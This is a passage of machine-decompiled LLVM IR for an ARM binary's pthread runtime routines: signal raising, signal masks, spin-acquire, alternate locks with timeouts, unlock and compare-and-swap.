  %v1_c6f8 = call i32 @__pthread_unlock(i32 %v5_c6a8)
  %v0_c704 = call i32 @kill()
  %v7_c708 = icmp eq i32 %v0_c704, -1
  br i1 %v7_c708, label %bb9, label %bb8

bb8:                                              ; preds = %dec_label_pc_c6f0
  %v0_c70c = load i32, i32* %r6.global-to-local, align 4
  %v3_c710 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_c710, i32* %r4.global-to-local, align 4
  ret i32 %v0_c70c

bb9:                                              ; preds = %dec_label_pc_c6f0
  %v0_c714 = call i32 @__errno_location()
  %v1_c718 = inttoptr i32 %v0_c714 to i32*
  %v2_c718 = load i32, i32* %v1_c718, align 4
  %v2_c71c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c71c, i32* %r4.global-to-local, align 4
  ret i32 %v2_c718

; uselistorder directives
  uselistorder i32 %v3_c6d0, { 1, 0 }
  uselistorder i32 %v5_c6a8, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0, 2 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c724 = load i32, i32* @r4, align 4
  store i32 %v3_c724, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_c72c = call i32 @__GI_pthread_self()
  %v0_c730 = load i32, i32* @r4, align 4
  %v2_c734 = call i32 @pthread_kill(i32 %v0_c72c, i32 %v0_c730)
  store i32 %v2_c734, i32* %r4.global-to-local, align 4
  %v2_c738 = icmp eq i32 %v2_c734, 0
  br i1 %v2_c738, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v3_c740 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_c740, i32* @r4, align 4
  ret i32 0

bb3:                                              ; preds = %entry
  %v0_c744 = call i32 @__errno_location()
  %v0_c748 = load i32, i32* %r4.global-to-local, align 4
  %v2_c748 = inttoptr i32 %v0_c744 to i32*
  store i32 %v0_c748, i32* %v2_c748, align 4
  %v2_c750 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c750, i32* @r4, align 4
  ret i32 -1
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-144 = alloca i32, align 4
  %v2_c758 = icmp eq i32 %arg2, 0
  %v2_c75c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_c758, label %dec_label_pc_c7e0, label %dec_label_pc_c76c

dec_label_pc_c76c:                                ; preds = %entry
  store i32 %v2_c75c, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_c75c, i32* @r4, align 4
  %v0_c778 = call i32 @memcpy()
  %v0_c77c = load i32, i32* @r5, align 4
  %v7_c77c = icmp eq i32 %v0_c77c, 1
  br i1 %v7_c77c, label %dec_label_pc_c7cc, label %dec_label_pc_c784

dec_label_pc_c784:                                ; preds = %dec_label_pc_c76c
  %v7_c784 = icmp eq i32 %v0_c77c, 2
  br i1 %v7_c784, label %dec_label_pc_c798, label %dec_label_pc_c78c

dec_label_pc_c78c:                                ; preds = %dec_label_pc_c784
  %v2_c78c = icmp eq i32 %v0_c77c, 0
  br i1 %v2_c78c, label %dec_label_pc_c7a8, label %dec_label_pc_c7dc

dec_label_pc_c798:                                ; preds = %dec_label_pc_c784
  store i32 %v2_c75c, i32* @r0, align 4
  %v2_c7a0 = load i32, i32* @global_var_2a7a8.307, align 4
  %v2_c7a4 = call i32 @__GI_sigaddset(i32 %v2_c75c, i32 %v2_c7a0)
  br label %dec_label_pc_c7a8

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c78c, %dec_label_pc_c798
  store i32 %v2_c75c, i32* @r0, align 4
  %v1_c7b4 = call i32 @__GI_sigdelset(i32 %v2_c75c)
  %v2_c7bc = load i32, i32* @global_var_2a7b0.202, align 4
  %tmp11 = icmp slt i32 %v2_c7bc, 1
  br i1 %tmp11, label %dec_label_pc_c7dc, label %dec_label_pc_c7d4

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c76c
  br label %dec_label_pc_c7d4

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c7a8, %dec_label_pc_c7cc
  store i32 %v2_c75c, i32* @r0, align 4
  %v1_c7d8 = call i32 @__GI_sigdelset(i32 %v2_c75c)
  br label %dec_label_pc_c7dc

dec_label_pc_c7dc:                                ; preds = %dec_label_pc_c78c, %dec_label_pc_c7a8, %dec_label_pc_c7d4
  %v0_c7e0.pre = load i32, i32* @r5, align 4
  %v0_c7e8.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %entry, %dec_label_pc_c7dc
  %v0_c7e8 = phi i32 [ %arg3, %entry ], [ %v0_c7e8.pre, %dec_label_pc_c7dc ]
  %v0_c7e4 = phi %_TYPEDEF_sigset_t* [ null, %entry ], [ %phitmp, %dec_label_pc_c7dc ]
  %v0_c7e0 = phi i32 [ %arg1, %entry ], [ %v0_c7e0.pre, %dec_label_pc_c7dc ]
  %v4_c7ec = call i32 @__GI_sigprocmask(i32 %v0_c7e0, %_TYPEDEF_sigset_t* %v0_c7e4, i32 %v0_c7e8)
  %v3_c7f0 = icmp eq i32 %v4_c7ec, -1
  %v8_c7f0 = icmp eq i32 %v4_c7ec, -1
  br i1 %v8_c7f0, label %bb12, label %bb

bb:                                               ; preds = %dec_label_pc_c7e0
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_c7e0, %bb
  %v14_c8085 = phi i32 [ %v4_c7ec, %dec_label_pc_c7e0 ], [ 0, %bb ]
  br i1 %v3_c7f0, label %dec_label_pc_c7fc, label %dec_label_pc_c804

dec_label_pc_c7fc:                                ; preds = %bb12
  %v0_c7fc = call i32 @__errno_location()
  %v1_c800 = inttoptr i32 %v0_c7fc to i32*
  %v2_c800 = load i32, i32* %v1_c800, align 4
  br label %dec_label_pc_c804

dec_label_pc_c804:                                ; preds = %bb12, %dec_label_pc_c7fc
  %v14_c808 = phi i32 [ %v14_c8085, %bb12 ], [ %v2_c800, %dec_label_pc_c7fc ]
  ret i32 %v14_c808

; uselistorder directives
  uselistorder i32 %v4_c7ec, { 1, 0, 2 }
  uselistorder i32 %v2_c75c, { 5, 4, 1, 0, 3, 2, 6, 7 }
  uselistorder label %dec_label_pc_c804, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_c7e0, { 1, 0 }
  uselistorder label %dec_label_pc_c7dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c7d4, { 1, 0 }
  uselistorder label %dec_label_pc_c7a8, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_c820 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_c860

dec_label_pc_c844:                                ; preds = %dec_label_pc_c860
  %v0_c844 = call i32 @sched_yield()
  %v0_c830.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_c860

dec_label_pc_c84c:                                ; preds = %dec_label_pc_c860
  store i32 0, i32* %stack_var_-24, align 4
  %v0_c858 = call i32 @nanosleep()
  %v0_c85c = load i32, i32* @r4, align 4
  br label %dec_label_pc_c860

dec_label_pc_c860:                                ; preds = %dec_label_pc_c844, %dec_label_pc_c84c, %entry
  %v0_c83c = phi i32 [ 0, %entry ], [ %v0_c830.pr, %dec_label_pc_c844 ], [ %v0_c85c, %dec_label_pc_c84c ]
  store i32 0, i32* @r4, align 4
  store i32 %v2_c820, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v1_c83c = add i32 %v0_c83c, 1
  store i32 %v1_c83c, i32* @r5, align 4
  %v8_c840 = icmp sgt i32 %v0_c83c, 49
  br i1 %v8_c840, label %dec_label_pc_c84c, label %dec_label_pc_c844

; uselistorder directives
  uselistorder i32 %v0_c83c, { 1, 0 }
  uselistorder label %dec_label_pc_c860, { 1, 0, 2 }
}

define i32 @wait_node_free(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_c87c = load i32, i32* @r4, align 4
  store i32 %v3_c87c, i32* %stack_var_-12, align 4
  %v1_c88c = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_2b168.327 to i32))
  %v2_c894 = load i32, i32* @global_var_2b164.329, align 4
  %v0_c898 = load i32, i32* @r5, align 4
  store i32 %v0_c898, i32* @global_var_2b164.329, align 4
  %v2_c89c = inttoptr i32 %v0_c898 to i32*
  store i32 %v2_c894, i32* %v2_c89c, align 4
  %v1_c8a4 = load i32, i32* @r4, align 4
  %v2_c8a4 = inttoptr i32 %v1_c8a4 to i32*
  store i32 0, i32* %v2_c8a4, align 4
  %v2_c8a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c8a8, i32* @r4, align 4
  ret i32 %v1_c88c
}

define i32 @__pthread_lock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_c8b4 = add i32 %arg1, 4
  %v1_c8b8 = call i32 @__pthread_acquire(i32 %v1_c8b4)
  ret i32 %v1_c8b8
}

define i32 @_thread_self.2() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_c8c0 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_c8c4 = load i32, i32* @sp, align 4
  %v3_c8c4 = icmp ult i32 %v0_c8c4, %v2_c8c0
  %v1_c8c8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_c8c8, i32* @r1, align 4
  br i1 %v3_c8c4, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_c8e4, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2a3e0 to i32), %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_c8e4 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_c8d8 = load i32, i32* @global_var_2b170.180, align 4
  %v3_c8dc = icmp ult i32 %v0_c8c4, %v2_c8d8
  br i1 %v3_c8dc, label %bb4, label %dec_label_pc_c8e4

dec_label_pc_c8e4:                                ; preds = %bb3
  %v2_c8e8 = load i32, i32* @global_var_2b174.182, align 4
  %v3_c8ec = icmp ult i32 %v0_c8c4, %v2_c8e8
  br i1 %v3_c8ec, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_c8e4, %bb3
  %v2_c8fc = load i32, i32* @global_var_2f558.186, align 4
  %v3_c900 = and i32 %v1_c8c8, -2097152
  %v4_c900 = xor i32 %v3_c900, -2097152
  %v2_c908 = icmp eq i32 %v2_c8fc, 0
  %v1_c90c = sub i32 -477, %v4_c900
  br i1 %v2_c908, label %dec_label_pc_c918, label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %bb4
  %v1_c914 = call i32 @__pthread_find_self(i32 %v1_c90c)
  br label %dec_label_pc_c918

dec_label_pc_c918:                                ; preds = %bb4, %dec_label_pc_c914
  %v0_c918 = phi i32 [ %v1_c90c, %bb4 ], [ %v1_c914, %dec_label_pc_c914 ]
  %v1_c918 = add i32 %v0_c918, -3
  ret i32 %v1_c918

; uselistorder directives
  uselistorder i32 %v1_c90c, { 1, 0 }
  uselistorder label %dec_label_pc_c918, { 1, 0 }
}

define i32 @_suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_c938 = load i32, i32* @r0, align 4
  %v1_c938 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_c938)
  ret i32 %v1_c938
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v1_c940 = add i32 %tmp, 4
  %v2_c948 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v1_c954 = call i32 @__pthread_acquire(i32 %v1_c940)
  %v0_c958 = load i32, i32* @r5, align 4
  %v1_c958 = inttoptr i32 %v0_c958 to i32*
  %v2_c958 = load i32, i32* %v1_c958, align 4
  store i32 %v2_c958, i32* %r4.global-to-local, align 4
  %v2_c95c = icmp eq i32 %v2_c958, 0
  br i1 %v2_c95c, label %.thread3, label %dec_label_pc_c970

.thread3:                                         ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 1, i32* %v1_c958, align 4
  br label %dec_label_pc_c994

dec_label_pc_c970:                                ; preds = %entry
  %v0_c970 = load i32, i32* @r7, align 4
  %v2_c970 = icmp eq i32 %v0_c970, 0
  br i1 %v2_c970, label %dec_label_pc_c978, label %dec_label_pc_c980

dec_label_pc_c978:                                ; preds = %dec_label_pc_c970
  %v0_c978 = call i32 @_thread_self.2()
  store i32 %v0_c978, i32* %r7.global-to-local, align 4
  %v1_c984.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c980

dec_label_pc_c980:                                ; preds = %dec_label_pc_c970, %dec_label_pc_c978
  %v1_c984 = phi i32 [ %v0_c958, %dec_label_pc_c970 ], [ %v1_c984.pre, %dec_label_pc_c978 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c984 = inttoptr i32 %v1_c984 to i32*
  store i32 %v2_c948, i32* %v2_c984, align 4
  %v2_c98c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v2_c98c, i32* %stack_var_-32, align 4
  store i32 1, i32* @r2, align 4
  br label %dec_label_pc_c994

dec_label_pc_c994:                                ; preds = %.thread3, %dec_label_pc_c980
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_c998 = load i32, i32* @r6, align 4
  %v2_c998 = inttoptr i32 %v1_c998 to i32*
  store i32 0, i32* %v2_c998, align 4
  %v0_c99c = load i32, i32* @r2, align 4
  %v1_c99c = load i32, i32* %r3.global-to-local, align 4
  %v9_c99c = icmp eq i32 %v0_c99c, %v1_c99c
  store i1 %v9_c99c, i1* @cpsr_z, align 1
  %v0_c9a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 51624, i32* @lr, align 4
  %v1_c9a4 = xor i1 %v9_c99c, true
  call void @__pseudo_cond_branch(i1 %v1_c9a4, i32 ptrtoint (i32* @global_var_c938.336 to i32))
  ret i32 %v0_c9a0

; uselistorder directives
  uselistorder label %dec_label_pc_c994, { 1, 0 }
  uselistorder label %dec_label_pc_c980, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_c9b0 = load i32, i32* @r4, align 4
  store i32 %v3_c9b0, i32* %stack_var_-28, align 4
  %v1_c9c4 = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_2b168.327 to i32))
  store i32 ptrtoint (i32* @global_var_2b164.329 to i32), i32* %r2.global-to-local, align 4
  %v2_c9cc = load i32, i32* @global_var_2b164.329, align 4
  %v2_c9d0 = icmp eq i32 %v2_c9cc, 0
  store i32 %v2_c9cc, i32* @r6, align 4
  br i1 %v2_c9d0, label %dec_label_pc_c9f8.critedge, label %.thread2

.thread2:                                         ; preds = %entry
  %v2_c9d8 = inttoptr i32 %v2_c9cc to i32*
  %v3_c9d8 = load i32, i32* %v2_c9d8, align 4
  store i32 %v3_c9d8, i32* @global_var_2b164.329, align 4
  store i32 ptrtoint (i32* @global_var_2b168.327 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_2b168.327, align 4
  br label %dec_label_pc_ca1c

dec_label_pc_c9f8.critedge:                       ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2b168.327 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_2b168.327, align 4
  %v1_c9fc = call i32 @malloc(i32 12)
  %v2_ca00 = icmp eq i32 %v1_c9fc, 0
  br i1 %v2_ca00, label %dec_label_pc_ca08, label %dec_label_pc_ca1c

dec_label_pc_ca08:                                ; preds = %dec_label_pc_c9f8.critedge
  %v0_ca08 = load i32, i32* @r7, align 4
  %v0_ca0c = load i32, i32* @r8, align 4
  %v2_ca10 = inttoptr i32 %v0_ca08 to i32*
  %v3_ca10 = call i32 @__pthread_alt_lock(i32* %v2_ca10, i32 %v0_ca0c)
  %v2_ca18 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_ca18, i32* @r4, align 4
  ret i32 1

dec_label_pc_ca1c:                                ; preds = %.thread2, %dec_label_pc_c9f8.critedge
  %v0_ca1c = load i32, i32* @r7, align 4
  %v1_ca1c = add i32 %v0_ca1c, 4
  %v1_ca24 = call i32 @__pthread_acquire(i32 %v1_ca1c)
  %v0_ca28 = load i32, i32* @r7, align 4
  %v1_ca28 = inttoptr i32 %v0_ca28 to i32*
  %v2_ca28 = load i32, i32* %v1_ca28, align 4
  store i32 %v2_ca28, i32* @r4, align 4
  %v2_ca2c = icmp eq i32 %v2_ca28, 0
  br i1 %v2_ca2c, label %.thread6, label %dec_label_pc_ca40

.thread6:                                         ; preds = %dec_label_pc_ca1c
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %v1_ca28, align 4
  br label %dec_label_pc_ca68

dec_label_pc_ca40:                                ; preds = %dec_label_pc_ca1c
  %v0_ca40 = load i32, i32* @r8, align 4
  %v2_ca40 = icmp eq i32 %v0_ca40, 0
  br i1 %v2_ca40, label %dec_label_pc_ca48, label %dec_label_pc_ca50

dec_label_pc_ca48:                                ; preds = %dec_label_pc_ca40
  %v0_ca48 = call i32 @_thread_self.2()
  store i32 %v0_ca48, i32* @r8, align 4
  br label %dec_label_pc_ca50

dec_label_pc_ca50:                                ; preds = %dec_label_pc_ca40, %dec_label_pc_ca48
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ca54 = load i32, i32* @r6, align 4
  %v2_ca54 = add i32 %v1_ca54, 8
  %v3_ca54 = inttoptr i32 %v2_ca54 to i32*
  store i32 0, i32* %v3_ca54, align 4
  %v0_ca58 = load i32, i32* @r4, align 4
  %v1_ca58 = load i32, i32* @r6, align 4
  %v2_ca58 = inttoptr i32 %v1_ca58 to i32*
  store i32 %v0_ca58, i32* %v2_ca58, align 4
  %v0_ca5c = load i32, i32* @r6, align 4
  %v1_ca5c = load i32, i32* @r7, align 4
  %v2_ca5c = inttoptr i32 %v1_ca5c to i32*
  store i32 %v0_ca5c, i32* %v2_ca5c, align 4
  %v0_ca60 = load i32, i32* @r8, align 4
  %v1_ca60 = load i32, i32* @r6, align 4
  %v2_ca60 = add i32 %v1_ca60, 4
  %v3_ca60 = inttoptr i32 %v2_ca60 to i32*
  store i32 %v0_ca60, i32* %v3_ca60, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ca68

dec_label_pc_ca68:                                ; preds = %.thread6, %dec_label_pc_ca50
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ca6c = load i32, i32* @r5, align 4
  %v2_ca6c = inttoptr i32 %v1_ca6c to i32*
  store i32 0, i32* %v2_ca6c, align 4
  %v0_ca70 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca70 = load i32, i32* %r3.global-to-local, align 4
  %v9_ca70 = icmp eq i32 %v0_ca70, %v1_ca70
  br i1 %v9_ca70, label %dec_label_pc_caa8, label %dec_label_pc_ca78

dec_label_pc_ca78:                                ; preds = %dec_label_pc_ca68
  %v0_ca78 = load i32, i32* @sl, align 4
  %v0_ca7c = load i32, i32* @r8, align 4
  %v2_ca80 = inttoptr i32 %v0_ca78 to i32*
  %v3_ca80 = call i32 @__pthread_timedsuspend_new(i32 %v0_ca7c, i32* %v2_ca80)
  %v2_ca84 = icmp eq i32 %v3_ca80, 0
  br i1 %v2_ca84, label %bb, label %dec_label_pc_caa8

bb:                                               ; preds = %dec_label_pc_ca78
  %v0_ca90 = load i32, i32* @r6, align 4
  %v1_ca90 = add i32 %v0_ca90, 8
  store i32 %v1_ca90, i32* %r3.global-to-local, align 4
  %v0_caa0 = load i32, i32* @r8, align 4
  store i32 %v0_caa0, i32* @r0, align 4
  %v1_caa4 = call i32 @_suspend(i32 %v0_caa0)
  br label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %dec_label_pc_ca78, %dec_label_pc_ca68, %bb
  %v0_caa8 = load i32, i32* @r6, align 4
  %v1_caac = inttoptr i32 %v0_caa8 to i32*
  %v2_caac = call i32 @wait_node_free(i32* %v1_caac)
  %v2_cab4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_cab4, i32* @r4, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v2_c9cc, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 6, 4, 5, 0 }
  uselistorder i32 ()* @_thread_self.2, { 1, 0 }
  uselistorder i32* @global_var_2b164.329, { 0, 2, 4, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_2b168.327 to i32), { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_caa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ca68, { 1, 0 }
  uselistorder label %dec_label_pc_ca50, { 1, 0 }
  uselistorder label %dec_label_pc_ca1c, { 1, 0 }
}

define i32 @__pthread_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_cac4 = add i32 %arg1, 4
  %v3_cac4 = inttoptr i32 %v2_cac4 to i32*
  store i32 0, i32* %v3_cac4, align 4
  %v0_cac8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_cac8
}

define i32 @__pthread_compare_and_swap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  %v1_cae8 = call i32 @__pthread_acquire(i32 %arg4)
  store i32 %v1_cae8, i32* %r0.global-to-local, align 4
  %v0_caec = load i32, i32* @r6, align 4
  %v1_caec = inttoptr i32 %v0_caec to i32*
  %v2_caec = load i32, i32* %v1_caec, align 4
  %v1_caf0 = load i32, i32* @r4, align 4
  %v9_caf0 = icmp eq i32 %v2_caec, %v1_caf0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v9_caf0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_caf8 = load i32, i32* @r7, align 4
  store i32 %v1_caf8, i32* %v1_caec, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_cb04 = load i32, i32* @r5, align 4
  %v2_cb04 = inttoptr i32 %v1_cb04 to i32*
  store i32 0, i32* %v2_cb04, align 4
  %v17_cb08 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v17_cb08

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_cb0c = load i32, i32* @r4, align 4
  store i32 %v3_cb0c, i32* %stack_var_-28, align 4
  %v1_cb14 = add i32 %tmp, 4
  store i32 %v1_cb14, i32* %r0.global-to-local, align 4
  %v1_cb1c = call i32 @__pthread_acquire(i32 %v1_cb14)
  store i32 %v1_cb1c, i32* %r0.global-to-local, align 4
  %v0_cb20.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cb20

dec_label_pc_cb20:                                ; preds = %dec_label_pc_cba0, %dec_label_pc_cba8, %entry
  %v0_cb3c = phi i32 [ %v0_cb20.pre, %entry ], [ %v0_cb2017, %dec_label_pc_cba8 ], [ %v0_cb2017, %dec_label_pc_cba0 ]
  %v1_cb20 = inttoptr i32 %v0_cb3c to i32*
  %v2_cb20 = load i32, i32* %v1_cb20, align 4
  store i32 %v2_cb20, i32* %r0.global-to-local, align 4
  %v7_cb24 = icmp eq i32 %v2_cb20, 1
  store i1 %v7_cb24, i1* @cpsr_z, align 1
  %tmp37 = or i32 %v2_cb20, 1
  %tmp38 = icmp eq i32 %tmp37, 1
  br i1 %tmp38, label %dec_label_pc_cbc8, label %dec_label_pc_cb4c.preheader

dec_label_pc_cb4c.preheader:                      ; preds = %dec_label_pc_cb20
  store i32 -2147483648, i32* %sl.global-to-local, align 4
  store i32 %v0_cb3c, i32* @r4, align 4
  store i32 %v2_cb20, i32* @r5, align 4
  br label %dec_label_pc_cb4c

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb4c.preheader, %dec_label_pc_cb70.backedge
  %v6_cb802 = phi i32 [ %v1_cb5c21, %dec_label_pc_cb70.backedge ], [ %v0_cb3c, %dec_label_pc_cb4c.preheader ]
  %v0_cb2018 = phi i32 [ %v0_cb2017, %dec_label_pc_cb70.backedge ], [ %v0_cb3c, %dec_label_pc_cb4c.preheader ]
  %v0_cb884 = phi i32 [ %v0_cb98, %dec_label_pc_cb70.backedge ], [ %v2_cb20, %dec_label_pc_cb4c.preheader ]
  %v1_cb4c = add i32 %v0_cb884, 8
  %v2_cb4c = inttoptr i32 %v1_cb4c to i32*
  %v3_cb4c = load i32, i32* %v2_cb4c, align 4
  %v2_cb50 = icmp eq i32 %v3_cb4c, 0
  br i1 %v2_cb50, label %dec_label_pc_cb74, label %dec_label_pc_cb58

dec_label_pc_cb58:                                ; preds = %dec_label_pc_cb4c
  %v1_cb58 = inttoptr i32 %v0_cb884 to i32*
  %v2_cb58 = load i32, i32* %v1_cb58, align 4
  %v2_cb5c = inttoptr i32 %v6_cb802 to i32*
  store i32 %v2_cb58, i32* %v2_cb5c, align 4
  %v2_cb60 = call i32 @wait_node_free(i32* %v1_cb58)
  store i32 %v2_cb60, i32* %r0.global-to-local, align 4
  %v0_cb64 = load i32, i32* @r4, align 4
  %v1_cb64 = load i32, i32* @r6, align 4
  %v1_cb68 = inttoptr i32 %v0_cb64 to i32*
  %v2_cb68 = load i32, i32* %v1_cb68, align 4
  store i32 %v2_cb68, i32* @r2, align 4
  br label %dec_label_pc_cb70.backedge

dec_label_pc_cb74:                                ; preds = %dec_label_pc_cb4c
  %v1_cb74 = add i32 %v0_cb884, 4
  %v2_cb74 = inttoptr i32 %v1_cb74 to i32*
  %v3_cb74 = load i32, i32* %v2_cb74, align 4
  %v1_cb78 = add i32 %v3_cb74, 24
  %v2_cb78 = inttoptr i32 %v1_cb78 to i32*
  %v3_cb78 = load i32, i32* %v2_cb78, align 4
  %v1_cb7c = load i32, i32* %sl.global-to-local, align 4
  %v5_cb80 = icmp slt i32 %v3_cb78, %v1_cb7c
  br i1 %v5_cb80, label %.thread3, label %bb

.thread3:                                         ; preds = %dec_label_pc_cb74
  store i32 %v0_cb884, i32* @r4, align 4
  %v1_cb8c5 = inttoptr i32 %v0_cb884 to i32*
  %v2_cb8c6 = load i32, i32* %v1_cb8c5, align 4
  store i32 %v2_cb8c6, i32* @r2, align 4
  br label %dec_label_pc_cb70.backedge

bb:                                               ; preds = %dec_label_pc_cb74
  store i32 %v0_cb884, i32* @r5, align 4
  store i32 %v0_cb884, i32* @r4, align 4
  %v1_cb8c = inttoptr i32 %v0_cb884 to i32*
  %v2_cb8c = load i32, i32* %v1_cb8c, align 4
  store i32 %v2_cb8c, i32* @r2, align 4
  store i32 %v3_cb78, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_cb70.backedge

dec_label_pc_cb70.backedge:                       ; preds = %bb, %dec_label_pc_cb58, %.thread3
  %v1_cb5c21 = phi i32 [ %v0_cb884, %.thread3 ], [ %v0_cb64, %dec_label_pc_cb58 ], [ %v0_cb884, %bb ]
  %v0_cb2017 = phi i32 [ %v0_cb2018, %.thread3 ], [ %v1_cb64, %dec_label_pc_cb58 ], [ %v0_cb2018, %bb ]
  %v0_cb98 = phi i32 [ %v2_cb8c6, %.thread3 ], [ %v2_cb68, %dec_label_pc_cb58 ], [ %v2_cb8c, %bb ]
  %v7_cb94 = icmp eq i32 %v0_cb98, 1
  store i32 %v0_cb98, i32* %r0.global-to-local, align 4
  br i1 %v7_cb94, label %dec_label_pc_cba0, label %dec_label_pc_cb4c

dec_label_pc_cba0:                                ; preds = %dec_label_pc_cb70.backedge
  %v0_cba0.pre = load i32, i32* %sl.global-to-local, align 4
  %v6_cba0 = icmp eq i32 %v0_cba0.pre, -2147483648
  br i1 %v6_cba0, label %dec_label_pc_cb20, label %dec_label_pc_cba8

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cba0
  br label %dec_label_pc_cb20

dec_label_pc_cbc8:                                ; preds = %dec_label_pc_cb20
  store i32 0, i32* %v1_cb20, align 4
